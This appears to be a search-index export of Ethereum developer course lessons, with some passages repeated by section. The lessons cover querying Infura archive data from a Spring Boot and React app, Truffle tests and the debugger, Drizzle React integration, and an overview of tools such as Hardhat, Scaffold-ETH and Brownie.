git clone git@github.com:anataliocs/Archive-Data-Playground.git Import the project into your IDE and it should build automatically. Our project uses gradle to build the back-end and npm/webpack for the front-end UI. Change directory into the project folder: cd archivedataplayground/ Then to run the full stack, invoke the Gradle wrapper: ./gradlew This command will start up the Spring Boot backend in dev mode and also the React front-end all in one command! After the application starts up you should see the following: 2022 - 05 - 31 11 : 21 : 45.262 INFO 83493 --- [ restartedMain ] i . i . a . ArchiveDataPlaygroundApp : Started ArchiveDataPlaygroundApp in 3.709 seconds ( JVM run ning for 3.924 ) 2022 - 05 - 31 11 : 21 : 45.264 INFO 83493 --- [ restartedMain ] i . i . a . ArchiveDataPlaygroundApp : ---------------------------------------------------------- Application ' archivedataplayground ' is run ning ! Access URLs : Local : http : // localhost : 8080 / External : http : // 192.168.0.37 : 8080 / Profile ( s ): [ dev , api - docs ] ---------------------------------------------------------- <============-> 92 % EXECUTING [ 2 m 15 s ] Navigate to the local server in a browser at http://localhost:8080/ On the right-hand corner click account -> Sign-in and use the canned login and password \u201cadmin/admin\u201d You will then have access to the application. The login flow comes from the base Jhipster project scaffolding tool that was used to create the basic project skeleton. You can directly query Infura JSON-RPC endpoints if you navigate to http://localhost:8080/admin/docs or click Administration -> API This will bring you to the Swagger UI interface where you can call JSON-RPC endpoints such as getting blocks older than 128 blocks which are available via Archive nodes with hydrated transactions. These calls can then be used in Block Explorer style applications or other use cases. Some specific blocks of code that help enable this functionality include: https://github.com/anataliocs/Archive-Data-Playground/blob/main/src/main/java/io/infura/archivedataplayground/config/InfuraConfig.java InfuraConfig.java @Configuration public class InfuraConfig { @Bean public RestTemplate restTemplate () { return new RestTemplate (); } } This code provides a \u201cRestTemplate\u201d singleton which can be injected in classes where it\u2019s needed and helps abstract away the complexity of making JSON-RPC calls to Infura. The dto.infura package contains POJO objects representing request and response JSONs used in Infura RPC calls. https://github.com/anataliocs/Archive-Data-Playground/tree/main/src/main/java/io/infura/archivedataplayground/service/dto/infura For instance, the following 3 DTO objects contain the block and hydrated transactions response from an eth_getBlockByNumber JSON-RPC call which can be used to get archive blocks from Ethereum\u2019s history. GetBlockByNumberResponse.java public class GetBlockByNumberResponse { private String jsonrpc; private String id; private GetBlockByNumberResult result; // Getters and setters } Infura POJO response to de-serialize JSON GetBlockByNumberResult.java public class GetBlockByNumberResult { private String difficulty; private String extraData; private String gasLimit; private String gasUsed; private String hash; private String logsBloom; private String miner; private String mixHash; private String nonce; private String number; private String parentHash; private String receiptsRoot; private String sha3Uncles; private String size; private String stateRoot; private String timestamp; private String totalDifficulty; private Transaction[] transactions; //Hydrated Transactions // Getters and setters } Infura POJO response to de-serialize JSON Transaction.java public class Transaction { private String blockHash; private String blockNumber; private String from; private String gas; private String gasPrice; private String hash; private String input; private String nonce; private String r; private String s; private String to; private String transactionIndex; private String type; private String v; private String value; } The included \u201cRestTemplate\u201d will automatically marshal/unmarshal responses into these Object types. You could also consider using https://github.com/web3j/web3j to help facilitate Infura JSON\u2013RPC calls made using the Spring Boot backend but this is a more heavyweight solution that contains a lot of stuff you might not need. The Front-end One feature that archive data enables is Block Exploration. This block explorer displays information about about famous blocks in Ethereum history such as: Frontier - Block height: 0 - Genesis block - Jul 30 2015 Frontier Thawing - Block height: 200000 - Ethereum price: $1.24 USD - Sep 07 2015 Homestead - Block height: 1,150,000 - Ethereum price: $12.50 USD - Mar 14 2016 The front-end is implemented using React and Typescript. This form allows you to submit a block number and look up that block\u2019s data and hydrated transactions. infura.tsx \u2026 <p className= \"lead\" > Explore historical Ethereum Data </p> <Form onSubmit= {handleBlockByNumberSubmit} > <ValidatedField name= \"blockNumber\" label= \"Block Number\" placeholder= \"Block Number in hex\" required autoFocus data-cy= \"blockNumber\" validate= {{ required : 'Block Number cannot be empty!' }} error={errors.blockNumber} isTouched= {touchedFields.blockNumber} /> <Button color= \"primary\" type= \"submit\" data-cy= \"submit\" > Search </Button><br/> </Form> \u2026 Submitting the form dispatches a request to the Spring Boot API and uses a reducer to parse the JSON returned from the backend and stores that state in Redux. infura.reducer.tsx \u2026 export const getInfura = createAsyncThunk ( 'infura/get_json' , async ( blocknumber : string ) => axios . get < any > ( ` api / infura /$ { blocknumber } ` ), { serializeError : serializeAxiosError , }); \u2026 This is only a simple example of functionality that access to archive data enables. Using this basic framework, you could create Ethereum block analytics, more detailed Block Explorers, back testing for trading algorithms and Blockchain forensics applications!","title":"Index"},{"location":"S04-developer-tooling/M3-infura/L2/#using-infura-to-access-ethereum-archive-data-tutorial","text":"This is a full-stack application that provides a reference implementation and proof-of-concept for various use cases that are enabled by access to Ethereum archive data. Check out the repo here: https://github.com/anataliocs/Archive-Data-Playground Technologies Used: Java 11 Spring Boot Gradle Typescript React/Redux node/npm","title":"Using Infura to Access Ethereum Archive Data (Tutorial)"},{"location":"S04-developer-tooling/M3-infura/L2/#setup-and-configuration","text":"The project is built with a Java/Spring Boot backend and a React front-end. You will need to install the following dependencies locally to run this project: An Infura account Git Node / npm Java 11 An IDE Get your API endpoint URL and Project ID Head to https://infura.io/ and go to your project settings page: Now let\u2019s set up our externalized configuration so that we can use our project ID without exposing those details on Github. The Spring Boot app uses Spring Dev Tools when running locally so we can use a .spring-boot-devtools.properties file for configuration properties. Configuration for MacOS users: Create the properties file: touch ~/.spring-boot-devtools.properties Open the properties file: vi ~/.spring-boot-devtools.properties Add the following line to properties file: infura.projectid=[YOUR_PROJECT_ID] Running the application: Pull down the source code: git clone git@github.com:anataliocs/Archive-Data-Playground.git Import the project into your IDE and it should build automatically. Our project uses gradle to build the back-end and npm/webpack for the front-end UI. Change directory into the project folder: cd archivedataplayground/ Then to run the full stack, invoke the Gradle wrapper: ./gradlew This command will start up the Spring Boot backend in dev mode and also the React front-end all in one command! After the application starts up you should see the following: 2022 - 05 - 31 11 : 21 : 45.262 INFO 83493 --- [ restartedMain ] i . i . a . ArchiveDataPlaygroundApp : Started ArchiveDataPlaygroundApp in 3.709 seconds ( JVM run ning for 3.924 ) 2022 - 05 - 31 11 : 21 : 45.264 INFO 83493 --- [ restartedMain ] i . i . a . ArchiveDataPlaygroundApp : ---------------------------------------------------------- Application ' archivedataplayground ' is run ning ! Access URLs : Local : http : // localhost : 8080 / External : http : // 192.168.0.37 : 8080 / Profile ( s ): [ dev , api - docs ] ---------------------------------------------------------- <============-> 92 % EXECUTING [ 2 m 15 s ] Navigate to the local server in a browser at http://localhost:8080/ On the right-hand corner click account -> Sign-in and use the canned login and password \u201cadmin/admin\u201d You will then have access to the application. The login flow comes from the base Jhipster project scaffolding tool that was used to create the basic project skeleton. You can directly query Infura JSON-RPC endpoints if you navigate to http://localhost:8080/admin/docs or click Administration -> API This will bring you to the Swagger UI interface where you can call JSON-RPC endpoints such as getting blocks older than 128 blocks which are available via Archive nodes with hydrated transactions. These calls can then be used in Block Explorer style applications or other use cases. Some specific blocks of code that help enable this functionality include: https://github.com/anataliocs/Archive-Data-Playground/blob/main/src/main/java/io/infura/archivedataplayground/config/InfuraConfig.java InfuraConfig.java @Configuration public class InfuraConfig { @Bean public RestTemplate restTemplate () { return new RestTemplate (); } } This code provides a \u201cRestTemplate\u201d singleton which can be injected in classes where it\u2019s needed and helps abstract away the complexity of making JSON-RPC calls to Infura. The dto.infura package contains POJO objects representing request and response JSONs used in Infura RPC calls. https://github.com/anataliocs/Archive-Data-Playground/tree/main/src/main/java/io/infura/archivedataplayground/service/dto/infura For instance, the following 3 DTO objects contain the block and hydrated transactions response from an eth_getBlockByNumber JSON-RPC call which can be used to get archive blocks from Ethereum\u2019s history. GetBlockByNumberResponse.java public class GetBlockByNumberResponse { private String jsonrpc; private String id; private GetBlockByNumberResult result; // Getters and setters } Infura POJO response to de-serialize JSON GetBlockByNumberResult.java public class GetBlockByNumberResult { private String difficulty; private String extraData; private String gasLimit; private String gasUsed; private String hash; private String logsBloom; private String miner; private String mixHash; private String nonce; private String number; private String parentHash; private String receiptsRoot; private String sha3Uncles; private String size; private String stateRoot; private String timestamp; private String totalDifficulty; private Transaction[] transactions; //Hydrated Transactions // Getters and setters } Infura POJO response to de-serialize JSON Transaction.java public class Transaction { private String blockHash; private String blockNumber; private String from; private String gas; private String gasPrice; private String hash; private String input; private String nonce; private String r; private String s; private String to; private String transactionIndex; private String type; private String v; private String value; } The included \u201cRestTemplate\u201d will automatically marshal/unmarshal responses into these Object types. You could also consider using https://github.com/web3j/web3j to help facilitate Infura JSON\u2013RPC calls made using the Spring Boot backend but this is a more heavyweight solution that contains a lot of stuff you might not need.","title":"Setup and Configuration"},{"location":"S04-developer-tooling/M3-infura/L2/#the-front-end","text":"One feature that archive data enables is Block Exploration. This block explorer displays information about about famous blocks in Ethereum history such as: Frontier - Block height: 0 - Genesis block - Jul 30 2015 Frontier Thawing - Block height: 200000 - Ethereum price: $1.24 USD - Sep 07 2015 Homestead - Block height: 1,150,000 - Ethereum price: $12.50 USD - Mar 14 2016 The front-end is implemented using React and Typescript. This form allows you to submit a block number and look up that block\u2019s data and hydrated transactions. infura.tsx \u2026 <p className= \"lead\" > Explore historical Ethereum Data </p> <Form onSubmit= {handleBlockByNumberSubmit} > <ValidatedField name= \"blockNumber\" label= \"Block Number\" placeholder= \"Block Number in hex\" required autoFocus data-cy= \"blockNumber\" validate= {{ required : 'Block Number cannot be empty!' }} error={errors.blockNumber} isTouched= {touchedFields.blockNumber} /> <Button color= \"primary\" type= \"submit\" data-cy= \"submit\" > Search </Button><br/> </Form> \u2026 Submitting the form dispatches a request to the Spring Boot API and uses a reducer to parse the JSON returned from the backend and stores that state in Redux. infura.reducer.tsx \u2026 export const getInfura = createAsyncThunk ( 'infura/get_json' , async ( blocknumber : string ) => axios . get < any > ( ` api / infura /$ { blocknumber } ` ), { serializeError : serializeAxiosError , }); \u2026 This is only a simple example of functionality that access to archive data enables. Using this basic framework, you could create Ethereum block analytics, more detailed Block Explorers, back testing for trading algorithms and Blockchain forensics applications!","title":"The Front-end"},{"location":"S04-developer-tooling/M4-truffle-deep-dive/L1-truffle-tests/","text":"Testing, 1, 2, 3 A comprehensive suite of tests adds robustness to your code as it evolves and Truffle provides an automated testing framework that makes adding this to your project a breeze. In the following examples, we\u2019ll be writing our tests in JavaScript, although Truffle also supports Solidity based tests too. Check out the following for when you might use one over the other. All your tests live in a dedicated tests directory, which is automatically created if you used truffle init to initialize your project, although you can of course create one after the fact. Go back to the SimpleStorage file directory we created in the previous lesson, \u201cIntro to Truffle -- Part II\u201d. To create your first test for SimpleStorage run the following: truffle create test SimpleStorage As with the earlier create command this creates a simple scaffold which includes a reference to the actual underlying contract artifact. Following this you can simply run the following to run the test suite. truffle test It\u2019s worth noting that the testing framework will temporarily spin up it\u2019s own Ganache with which to run the tests against (which it subsequently tears down), thus ensuring it doesn\u2019t pollute any existing instances you might have running. Let\u2019s try running it again with a more meaningful test. Feel free to copy and paste the following into your own test and try running truffle test again. contract ( \"SimpleStorage\" , function ( /* accounts */ ) { it ( \"should assert true\" , async function () { const simpleStorage = await SimpleStorage . deployed (); await simpleStorage . set ( 42 ); return assert . equal ( await simpleStorage . get (), 42 ); }); }); All going well everything should pass again and you\u2019ll see similar output to the following: Contract : SimpleStorage \u2713 should assert true ( 132 ms ) 1 passing ( 167 ms ) As can be inferred from the above example, tests are typically written using the AAA (Arrange, Act, Assert) pattern. In addition, you can access the accounts array and access to the web3 library. More detail can be found on tests here .","title":"Testing, 1, 2, 3"},{"location":"S04-developer-tooling/M4-truffle-deep-dive/L1-truffle-tests/#testing-1-2-3","text":"A comprehensive suite of tests adds robustness to your code as it evolves and Truffle provides an automated testing framework that makes adding this to your project a breeze. In the following examples, we\u2019ll be writing our tests in JavaScript, although Truffle also supports Solidity based tests too. Check out the following for when you might use one over the other. All your tests live in a dedicated tests directory, which is automatically created if you used truffle init to initialize your project, although you can of course create one after the fact. Go back to the SimpleStorage file directory we created in the previous lesson, \u201cIntro to Truffle -- Part II\u201d. To create your first test for SimpleStorage run the following: truffle create test SimpleStorage As with the earlier create command this creates a simple scaffold which includes a reference to the actual underlying contract artifact. Following this you can simply run the following to run the test suite. truffle test It\u2019s worth noting that the testing framework will temporarily spin up it\u2019s own Ganache with which to run the tests against (which it subsequently tears down), thus ensuring it doesn\u2019t pollute any existing instances you might have running. Let\u2019s try running it again with a more meaningful test. Feel free to copy and paste the following into your own test and try running truffle test again. contract ( \"SimpleStorage\" , function ( /* accounts */ ) { it ( \"should assert true\" , async function () { const simpleStorage = await SimpleStorage . deployed (); await simpleStorage . set ( 42 ); return assert . equal ( await simpleStorage . get (), 42 ); }); }); All going well everything should pass again and you\u2019ll see similar output to the following: Contract : SimpleStorage \u2713 should assert true ( 132 ms ) 1 passing ( 167 ms ) As can be inferred from the above example, tests are typically written using the AAA (Arrange, Act, Assert) pattern. In addition, you can access the accounts array and access to the web3 library. More detail can be found on tests here .","title":"Testing, 1, 2, 3"},{"location":"S04-developer-tooling/M4-truffle-deep-dive/L2-debug-config-forking/","text":"Squashing Bugs with the Debugger Debugging is an important part of any software development lifecycle and Truffle ships with a full CLI-based, interactive debugger to help you squash those pesky bugs. A debug instance is always instantiated off the back of a transaction (tx) hash (as we saw returned when we invoked storage.set(42) in the earlier example). For example: { tx: '0x46e4bb35108e5ecf7ff656008295fda572a753476d5e04c286fcdb7868447dd6', receipt: { transactionHash: '0x46e4bb35108e5ecf7ff656008295fda572a753476d5e04c286fcdb7868447dd6', transactionIndex: 0, blockHash: '0x85dbdf5d71194cb0d841d58bbac283ccf078ce0ebe1c054c6c2ab76442459894', blockNumber: 9, from: '0x5ca1605d4671669b38f7e37c881ed996ede5ac68', to: '0x524b2860a2489e385c5e12537f58d5a09a9d33ab', ... } Running the Debugger Assuming we have a valid transaction hash the debugger is simply invoked as follows. Note that you\u2019ll need to paste in a hash of a transaction that exists on the chain you\u2019re debugging against. truffle debug 0x4a1dcabb384e6ca1b5091495349603499fc2022e5832efdb53f872b6ff23a1c0 Assuming all is good, you should now see the following output (note that the full list of commands has been truncated for brevity): Starting Truffle Debugger ... Addresses affected : 0x6cA2F11a43b2B8f4DCE7De62f8Dc03f8E12BC48F - SimpleStorage Commands : ( enter ) last command entered ( step next ) ( o ) step over , ( i ) step into , ( u ) step out , ( n ) step next ( c ) continue until breakpoint , ( Y ) reset & continue to previous error ( y ) ( if at end ) reset & continue to final error (;) step instruction ( include number to step multiple ) SimpleStorage . sol : 2 : pragma solidity >= 0 . 4 . 21 < 0 . 7 . 0 ; 3 : 4 : contract SimpleStorage { ^^^^^^^^^^^^^^^^^^^^^^^^ You can now start stepping through your code in a manner similar to that of any traditional debugger. As stated in the Truffle docs though it\u2019s worth noting that \u201cyou're not running the code in real-time; instead, you're stepping over the historical execution of that transaction, and mapping that execution onto its associated code\u201d. In the above example, stepping over a couple of times brings us into our SimpleStorage.sol contract wherein we can see our storedData state variable being assigned its new value. SimpleStorage . sol : 7 : event setEvent ( uint newValue ); 8 : 9 : function set ( uint x ) public { ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ debug( develop : 0 x8bd62b08 ... ) > o SimpleStorage . sol : 8 : 9 : function set ( uint x ) public { 10 : storedData = x ; In-test Debugging Lastly, a feature available as of Truffle v5.1 is that of in-test debugging. This essentially enables you to interrupt your tests by simply wrapping a given line with await debug(). More detail on in-test debugging with a simple example here .","title":"Index"},{"location":"S04-developer-tooling/M4-truffle-deep-dive/L2-debug-config-forking/#squashing-bugs-with-the-debugger","text":"Debugging is an important part of any software development lifecycle and Truffle ships with a full CLI-based, interactive debugger to help you squash those pesky bugs. A debug instance is always instantiated off the back of a transaction (tx) hash (as we saw returned when we invoked storage.set(42) in the earlier example). For example: { tx: '0x46e4bb35108e5ecf7ff656008295fda572a753476d5e04c286fcdb7868447dd6', receipt: { transactionHash: '0x46e4bb35108e5ecf7ff656008295fda572a753476d5e04c286fcdb7868447dd6', transactionIndex: 0, blockHash: '0x85dbdf5d71194cb0d841d58bbac283ccf078ce0ebe1c054c6c2ab76442459894', blockNumber: 9, from: '0x5ca1605d4671669b38f7e37c881ed996ede5ac68', to: '0x524b2860a2489e385c5e12537f58d5a09a9d33ab', ... }","title":"Squashing Bugs with the Debugger"},{"location":"S04-developer-tooling/M4-truffle-deep-dive/L2-debug-config-forking/#running-the-debugger","text":"Assuming we have a valid transaction hash the debugger is simply invoked as follows. Note that you\u2019ll need to paste in a hash of a transaction that exists on the chain you\u2019re debugging against. truffle debug 0x4a1dcabb384e6ca1b5091495349603499fc2022e5832efdb53f872b6ff23a1c0 Assuming all is good, you should now see the following output (note that the full list of commands has been truncated for brevity): Starting Truffle Debugger ... Addresses affected : 0x6cA2F11a43b2B8f4DCE7De62f8Dc03f8E12BC48F - SimpleStorage Commands : ( enter ) last command entered ( step next ) ( o ) step over , ( i ) step into , ( u ) step out , ( n ) step next ( c ) continue until breakpoint , ( Y ) reset & continue to previous error ( y ) ( if at end ) reset & continue to final error (;) step instruction ( include number to step multiple ) SimpleStorage . sol : 2 : pragma solidity >= 0 . 4 . 21 < 0 . 7 . 0 ; 3 : 4 : contract SimpleStorage { ^^^^^^^^^^^^^^^^^^^^^^^^ You can now start stepping through your code in a manner similar to that of any traditional debugger. As stated in the Truffle docs though it\u2019s worth noting that \u201cyou're not running the code in real-time; instead, you're stepping over the historical execution of that transaction, and mapping that execution onto its associated code\u201d. In the above example, stepping over a couple of times brings us into our SimpleStorage.sol contract wherein we can see our storedData state variable being assigned its new value. SimpleStorage . sol : 7 : event setEvent ( uint newValue ); 8 : 9 : function set ( uint x ) public { ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ debug( develop : 0 x8bd62b08 ... ) > o SimpleStorage . sol : 8 : 9 : function set ( uint x ) public { 10 : storedData = x ;","title":"Running the Debugger"},{"location":"S04-developer-tooling/M4-truffle-deep-dive/L2-debug-config-forking/#in-test-debugging","text":"Lastly, a feature available as of Truffle v5.1 is that of in-test debugging. This essentially enables you to interrupt your tests by simply wrapping a given line with await debug(). More detail on in-test debugging with a simple example here .","title":"In-test Debugging"},{"location":"S04-developer-tooling/M4-truffle-deep-dive/L3-drizzle-ui/","text":"Wire up the React app with Drizzle *Note that Drizzle is currently not actively maintained by Truffle, although the team is always happy to provide best-endeavors support. In addition, ConsenSys is actively hiring for front-end focused roles and/or folks interested in assisting with maintenance. Feel free to reach out if this might of interest! Before we go further, let's start our React app by running the follow command inside our client directory: npm install @drizzle / store npm start This will serve the front-end under localhost:3000 so open that up in your browser. Note: Make sure to use an incognito window if you already have MetaMask installed (or disable MetaMask for now). Otherwise, the app will try to use the network specified in MetaMask rather than the develop network under localhost:9545 . If the default Create-React-App page loaded without any issues, you may proceed. Setup the store The first thing we need to do is to setup and instantiate the Drizzle store. We are going add the following code to client/src/index.js: import drizzle functions and contract artifact import { Drizzle } from \"@drizzle/store\" ; import MyStringStore from \"./contracts/MyStringStore.json\" ; let drizzle know what contracts we want and how to access our test blockchain const options = { contracts : [ MyStringStore ], web3 : { fallback : { type : \"ws\" , url : \"ws://127.0.0.1:9545\" , }, }, }; setup drizzle const drizzle = new Drizzle ( options ); First, we imported the tools from Drizzle as well as the contract definition. We then built our options object for Drizzle, which in this case is just specifying the specific contract we want to be loaded by passing in the JSON build artifact. And finally, we created the drizzleStore and used that to create our drizzle instance which we will pass in as a prop to our App component. Once that is complete, your index.js should look something like this: import React from 'react' ; import ReactDOM from 'react-dom' ; import './index.css' ; import App from './App' ; import * as serviceWorker from './serviceWorker' ; import drizzle functions and contract artifact import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./contracts/MyStringStore.json\" ; let drizzle know what contracts we want and how to access our test blockchain const options = { contracts : [ MyStringStore ], web3 : { fallback : { type : \"ws\" , url : \"ws://127.0.0.1:9545\" , }, }, }; setup the drizzle store and drizzle const drizzle = new Drizzle ( options ); ReactDOM . render ( < App drizzle = { drizzle } /> , document . getElementById ( 'root' )); Note again that the drizzle instance is passed into the App component as props. Drizzle Components Drizzle maintains a library of React components for commonly used dapp functions. For example, generating input forms for contracts. Components LoadingContainer This components wraps your entire app (but within the DrizzleProvider) and will show a loading screen until Drizzle, and therefore web3 and your contracts, are initialized. loadingComp ( component ) The component displayed while Drizzle intializes. errorComp (component) The component displayed if Drizzle initialization fails. ContractData contract(string, required) Name of the contract to call. method (string, required Method of the contract to call. methodArgs (array) Arguments for the contract method call. EX: The address for an ERC20 balanceOf() function. The last argument can optionally be an options object with the typical from, gas and gasPrice keys. hideIndicator(boolean) If true, hides the loading indicator during contract state updates. Useful for things like ERC20 token symbols which do not change. toUtf8 (boolean) Converts the return value to a UTF-8 string before display. toAscii (boolean) Converts the return value to an Ascii string before display. ContractForm contract (string, required Name of the contract whose method will be the basis the form. method (string, required) Method whose inputs will be used to create corresponding form fields. sendArgs (object) An object specifying options for the transaction to be sent; namely: from, gasPrice, gas and value. Further explanation of these parameters can be found here in the web3 documentation. labels (array) Custom labels; will follow ABI input ordering. Useful for friendlier names. For example \"_to\" becoming \"Recipient Address\".","title":"Wire up the React app with Drizzle"},{"location":"S04-developer-tooling/M4-truffle-deep-dive/L3-drizzle-ui/#wire-up-the-react-app-with-drizzle","text":"*Note that Drizzle is currently not actively maintained by Truffle, although the team is always happy to provide best-endeavors support. In addition, ConsenSys is actively hiring for front-end focused roles and/or folks interested in assisting with maintenance. Feel free to reach out if this might of interest! Before we go further, let's start our React app by running the follow command inside our client directory: npm install @drizzle / store npm start This will serve the front-end under localhost:3000 so open that up in your browser. Note: Make sure to use an incognito window if you already have MetaMask installed (or disable MetaMask for now). Otherwise, the app will try to use the network specified in MetaMask rather than the develop network under localhost:9545 . If the default Create-React-App page loaded without any issues, you may proceed.","title":"Wire up the React app with Drizzle"},{"location":"S04-developer-tooling/M4-truffle-deep-dive/L3-drizzle-ui/#setup-the-store","text":"The first thing we need to do is to setup and instantiate the Drizzle store. We are going add the following code to client/src/index.js: import drizzle functions and contract artifact import { Drizzle } from \"@drizzle/store\" ; import MyStringStore from \"./contracts/MyStringStore.json\" ; let drizzle know what contracts we want and how to access our test blockchain const options = { contracts : [ MyStringStore ], web3 : { fallback : { type : \"ws\" , url : \"ws://127.0.0.1:9545\" , }, }, }; setup drizzle const drizzle = new Drizzle ( options ); First, we imported the tools from Drizzle as well as the contract definition. We then built our options object for Drizzle, which in this case is just specifying the specific contract we want to be loaded by passing in the JSON build artifact. And finally, we created the drizzleStore and used that to create our drizzle instance which we will pass in as a prop to our App component. Once that is complete, your index.js should look something like this: import React from 'react' ; import ReactDOM from 'react-dom' ; import './index.css' ; import App from './App' ; import * as serviceWorker from './serviceWorker' ; import drizzle functions and contract artifact import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./contracts/MyStringStore.json\" ; let drizzle know what contracts we want and how to access our test blockchain const options = { contracts : [ MyStringStore ], web3 : { fallback : { type : \"ws\" , url : \"ws://127.0.0.1:9545\" , }, }, }; setup the drizzle store and drizzle const drizzle = new Drizzle ( options ); ReactDOM . render ( < App drizzle = { drizzle } /> , document . getElementById ( 'root' )); Note again that the drizzle instance is passed into the App component as props.","title":"Setup the store"},{"location":"S04-developer-tooling/M4-truffle-deep-dive/L3-drizzle-ui/#drizzle-components","text":"Drizzle maintains a library of React components for commonly used dapp functions. For example, generating input forms for contracts. Components","title":"Drizzle Components"},{"location":"S04-developer-tooling/M4-truffle-deep-dive/L3-drizzle-ui/#loadingcontainer","text":"This components wraps your entire app (but within the DrizzleProvider) and will show a loading screen until Drizzle, and therefore web3 and your contracts, are initialized. loadingComp ( component ) The component displayed while Drizzle intializes. errorComp (component) The component displayed if Drizzle initialization fails.","title":"LoadingContainer"},{"location":"S04-developer-tooling/M4-truffle-deep-dive/L3-drizzle-ui/#contractdata","text":"contract(string, required) Name of the contract to call. method (string, required Method of the contract to call. methodArgs (array) Arguments for the contract method call. EX: The address for an ERC20 balanceOf() function. The last argument can optionally be an options object with the typical from, gas and gasPrice keys. hideIndicator(boolean) If true, hides the loading indicator during contract state updates. Useful for things like ERC20 token symbols which do not change. toUtf8 (boolean) Converts the return value to a UTF-8 string before display. toAscii (boolean) Converts the return value to an Ascii string before display.","title":"ContractData"},{"location":"S04-developer-tooling/M4-truffle-deep-dive/L3-drizzle-ui/#contractform","text":"contract (string, required Name of the contract whose method will be the basis the form. method (string, required) Method whose inputs will be used to create corresponding form fields. sendArgs (object) An object specifying options for the transaction to be sent; namely: from, gasPrice, gas and value. Further explanation of these parameters can be found here in the web3 documentation. labels (array) Custom labels; will follow ABI input ordering. Useful for friendlier names. For example \"_to\" becoming \"Recipient Address\".","title":"ContractForm"},{"location":"S04-developer-tooling/M5-other-dev-tools/","text":"Other Development Tools Before we dive into these other development frameworks, we wanted to provide an \"offramp\" to folks who may not be comfortable with JavaScript Frameworks. We'd encourage you to check out the sections on Node and JavaScript Frameworks in the Basic Training course. People uncomfortable with terminal-based development might be interested in JSUI, a GUI-based JavaScript framework development environment. You can also checkout some frontend boilerplate projects here. Hardhat Another popular development framework is Hardhat, which actually started as a fork of Truffle. It has since grown to create its own suite of tools and a devoted community. Hardhat divides itself into \"tasks\" and \"plugins\". Running npx hardhat compile is a task, for example. Plugins are extended functionality ported into Hardhat. Gas Reporter and Contract Sizer are two popular plugins for Hardhat. Why choose Hardhat? Some feel as though the command-line experience of Hardhat is faster than Truffle. Others like the extensive plugin features. One feature popular with Hardhat developers is their use of console.log() in smart contracts. When developing locally with Hardhat, you can import the console.sol contract, like so: pragma solidity ^0.6.0; import \"hardhat/console.sol\"; contract Token { //... } You can then add it to your contract when developing it locally: function transfer(address to, uint256 amount) external { console.log(\"Sender balance is %s tokens\", balances[msg.sender]); console.log(\"Trying to send %s tokens to %s\", amount, to); require(balances[msg.sender] >= amount, \"Not enough tokens\"); balances[msg.sender] -= amount; balances[to] += amount; } Which gives you this output when running locally on the Hardhat Network: $ npx hardhat test Token contract Deployment \u2713 Should set the right owner \u2713 Should assign the total supply of tokens to the owner Transactions Sender balance is 1000 tokens Trying to send 50 tokens to 0xead9c93b79ae7c1591b1fb5323bd777e86e150d4 Sender balance is 50 tokens Trying to send 50 tokens to 0xe5904695748fe4a84b40b3fc79de2277660bd1d3 \u2713 Should transfer tokens between accounts (373ms) \u2713 Should fail if sender doesn\u2019t have enough tokens Sender balance is 1000 tokens Trying to send 100 tokens to 0xead9c93b79ae7c1591b1fb5323bd777e86e150d4 Sender balance is 900 tokens Trying to send 100 tokens to 0xe5904695748fe4a84b40b3fc79de2277660bd1d3 \u2713 Should update balances after transfers (187ms) 5 passing (2s) You can learn more about this feature in their documentation here. Here are some easy ways to get started using Hardhat to see how you like it: - Hardhat's Beginner Tutorial and Project Setup - Hardhat Development Network - Index of Reusable Plugins The Hardhat teams recommends \"paying attention to see whether any plugins already solve problems [you] may have.\" Scaffold-ETH Scaffold-ETH ( docs ) is a project from prolific builder Austin Griffith meant to minimize the time between thinking of a decentralized app idea and deploying it to the world. However, Scaffold-ETH requires an advanced comfortability with tools like Yarn, Solidity, Hardhat, React, etc. It's best for folks who already have a very solid Web 2 or Web 3 workflow. For those folks, Scaffold-ETH is jet fuel! Please note, however, that projects and tutorials in Scaffold-ETH have not been audited in any way and may contain bugs or vulnerabilities! In the repo, Austin has provided a number of forks that correspond to different template projects or tutorials. Read more about the tutorials and examples here. As we mentioned, Scaffold-ETH by default serves up a React App, with pre-built components, and hooks. It's also incorporated a third-party UI library called Ant Design to help with the designing of components. It also incorporates Surge, a static-site generator to publish your app. Scaffold-ETH also has significant infrastructure support for the later parts of the development cycle, such as The Graph, Tenderly, Etherscan, and L2/Sidechain Services (deploying to Optimism and Arbitrum). Also, there are examples from some great projects in the space, like Aave, The Graph, Chainlink, Optimism and Uniswap. You can also learn about common design patterns such as commit-reveal, ecrecover, multisigs, DEXes, and more! Last, Austin is an incredibly proflific creator of content, including support videos and walkthroughs of Scaffold-ETH. Below are some recent walkthroughs he's done: Tutorial: Austin walks through Scaffold-Eth during Polygon Hackathon Start Building Today with Scaffold-ETH Ethereum Dev Onboarding (ETHGlobal) Austin walksthrough Scaffold-ETH after RicMoo and Paul Berg walkthrough their awesome tools Web 2 dev to Web 3 dev Blockchain at Berkeley: Austin Griffith Developer Walkthrough If you follow Austin on twitter or join the Scaffold-ETH Telegram, you'll get updates and assistance there as well. Brownie As we mentioned earlier, Brownie is a Python-based development and testing framework for smart contracts running on the EVM. It uses Web3.py as well as Solidity. It is most well-known for being the development framework the Yearn.Finance team uses to build their powerful DeFi platform and CRV. Brownie definitely takes some notes from Truffle (they are both \"sweet\"){target=_blank}, including having a brownie init command and their equivalent of Truffle boxes, \"Brownie Mixes.\" This makes it an easy tool for a lot of Truffle developers familiar with Truffle. Here are some tutorials to introduce you to Brownie: Tutorial: Develop a DeFi Project using Python (Chainlink){target=_blank} Tutorial: Vyper and Brownie Contract Development on EVM Chains An interesting tutorial walking through developing a contract using Vyper and Brownie. Tenderly Tenderly provides a way to both be alerted to contract events as well as troubleshoot a contract, including a \"Forking Mainnet\" feature similar to that of Truffle and Hardhat. Frontend Tools For your project, we've also discussed frontend interfaces. There are two services you can use for free to create a frontend instance easily: - Heroku is a Platform-as-a-Service, providing a quick way to deploy apps in a number of popular languages, such as Node.js (JavaScript), Python, Ruby and Go. You can connect your GitHub repo to your project for easy deployment. Heroku's basic plan is free and provides basic resources for getting started. Read more here. - Netlify also has a Git-based workflow allowing you to deploy your project easily from GitHub. It is also free and has a getting started manual here. There are so many more amazing tools that we can't get into now, but if you check out the links in this section, you'll be able to dive deeper and learn more on your own! Additional Material Article: The Complete Guide to Full Stack Ethereum Development An incredibly comprehensive article from Nader Dabit of The Graph. Article: Ethereum Dev Speed Run (Austin Griffith) Quick start for developers starting on Ethereum. Ethereum Dev Onboarding (ETHGlobal) Walkthrough of the developer 